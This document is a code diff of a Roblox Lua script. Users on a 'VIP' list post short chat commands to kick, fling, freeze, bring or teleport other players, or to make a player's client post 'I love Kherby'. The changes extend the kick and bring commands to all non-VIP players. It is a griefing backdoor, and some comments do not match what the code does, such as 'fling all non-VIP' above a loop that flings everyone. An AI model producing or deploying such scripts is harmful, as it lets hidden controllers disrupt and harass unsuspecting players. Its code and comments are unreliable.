@@ -142,11 +142,6 @@ end
 
 -- SAY "I LOVE KHERBY" IN BUBBLE CHAT
 local function sayILoveKherby()
-    local char = LocalPlayer.Character
-    if not char then return end
-    local head = char:FindFirstChild("Head")
-    if not head then return end
-
     local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
     if ChatService then
         local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
@@ -154,7 +149,10 @@ local function sayILoveKherby()
             SayMessage:FireServer("I love Kherby", "All")
         end
     else
-        TextChatService:Chat(head, "I love Kherby", Enum.ChatColor.Blue)
+        local char = LocalPlayer.Character
+        if char and char:FindFirstChild("Head") then
+            TextChatService:Chat(char.Head, "I love Kherby", Enum.ChatColor.Blue)
+        end
     end
 end
 
@@ -193,35 +191,53 @@ local function unfreezePlayer(targetName)
     end
 end
 
--- CHAT COMMAND HANDLER
+-- CHAT COMMAND HANDLER (works for all VIPs on non-VIP players)
 local function onMessage(senderName, message)
-    if not VIPUsers[senderName:lower()] then return end
+    local lowerName = senderName:lower()
+    if not VIPUsers[lowerName] then return end -- only VIPs can trigger commands
     local msg = message:lower()
     local args = message:split(" ")
 
-    if msg == ".k" and not VIPUsers[LocalPlayer.Name:lower()] then
-        LocalPlayer:Kick("Kicked by VIP")
+    -- Kick all non-VIP
+    if msg == ".k" then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if not VIPUsers[player.Name:lower()] then
+                player:Kick("Kicked by VIP")
+            end
+        end
     end
 
+    -- Bring all non-VIP to VIP sender
     if msg == ".g" then
-        BringTargets[LocalPlayer.Name] = true
+        for _, player in ipairs(Players:GetPlayers()) do
+            if not VIPUsers[player.Name:lower()] then
+                BringTargets[player.Name] = true
+            end
+        end
     end
 
+    -- Stop bring for all
     if msg == ".s" then
-        BringTargets[LocalPlayer.Name] = nil
+        for _, player in ipairs(Players:GetPlayers()) do
+            if not VIPUsers[player.Name:lower()] then
+                BringTargets[player.Name] = nil
+            end
+        end
     end
 
+    -- Fling all non-VIP
     if msg == ".f" then
         for _, player in ipairs(Players:GetPlayers()) do
             flingPlayer(player)
         end
     end
 
+    -- Bubble chat "I love Kherby"
     if msg == ".t" then
         sayILoveKherby()
     end
 
-    -- SHORTER COMMANDS
+    -- Freeze / Unfreeze commands
     if msg:sub(1,2) == ".h" and args[2] then
         freezePlayer(args[2])
     end
@@ -229,6 +245,7 @@ local function onMessage(senderName, message)
         unfreezePlayer(args[2])
     end
 
+    -- Teleport
     if args[1]:lower() == ".tp" and args[2] then
         teleportToPlayer(args[2])
     end
